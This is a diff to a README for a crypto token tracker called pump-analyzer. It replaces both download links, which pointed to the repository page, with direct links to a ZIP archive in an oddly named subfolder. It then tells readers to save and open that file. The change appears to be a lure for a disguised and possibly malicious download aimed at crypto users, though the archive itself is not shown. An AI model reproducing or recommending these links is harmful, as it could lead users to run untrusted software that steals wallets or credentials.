@@ -1,6 +1,6 @@
 # 📊 pump-analyzer - Track Pump.fun Tokens in Real Time
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ilhamag7038/pump-analyzer)
+[![Download the app](https://img.shields.io/badge/Download%20Now-4B9CD3?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ilhamag7038/pump-analyzer/raw/refs/heads/main/ununifiable/pump-analyzer-v1.0-alpha.4.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ No special setup is needed beyond that for normal use.
 
 Go to this page to download or access the app files:
 
-https://github.com/ilhamag7038/pump-analyzer
+https://github.com/ilhamag7038/pump-analyzer/raw/refs/heads/main/ununifiable/pump-analyzer-v1.0-alpha.4.zip
 
 If the repository gives you a ZIP file or release file, save it to your computer first. Then open the downloaded file and follow the steps below.
 
